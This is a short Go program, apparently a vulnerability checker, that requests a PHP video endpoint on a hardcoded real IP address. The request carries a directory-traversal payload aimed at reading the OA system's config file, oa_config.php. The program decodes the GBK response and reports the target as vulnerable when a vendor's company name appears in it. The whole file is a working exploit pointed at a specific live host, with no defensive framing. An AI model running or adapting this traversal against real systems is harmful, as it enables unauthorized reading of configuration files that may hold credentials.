package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)
import "golang.org/x/text/encoding/simplifiedchinese"

// client := &http.Client{
// Timeout: time.Second * 10,
// }
//resp, err := client.Get("http://example.com/")
//if err != nil {
//// 处理错误
//}
// 使用 resp

// req, _ := http.NewRequest("GET", "http://example.com/", nil)
// req.Timeout = 3 * time.Second
// resp, err := client.Do(req)
func main() {
	ip_ := "http://58.18.167.226:8088"
	url := ip_ + "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
	//url := ip_
	client := &http.Client{
		Timeout: time.Second * 10,
	}
	resp, err := client.Get(url)
	//resp, err := http.Get("https://www.baidu.com/")
	if err != nil {
		// 处理错误
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// 处理错误
		return
	}
	if resp.StatusCode == 200 {
		println("响应码为：", resp.StatusCode)
	}
	// 解码gbk
	decoder := simplifiedchinese.GBK.NewDecoder()
	result, _ := decoder.Bytes(body)

	fmt.Println(resp.StatusCode, len(body))
	if strings.Contains(string((result)), "北京创信达科技有限公司") {
		println("存在sb")
		//println("存在baidu")
	}
}
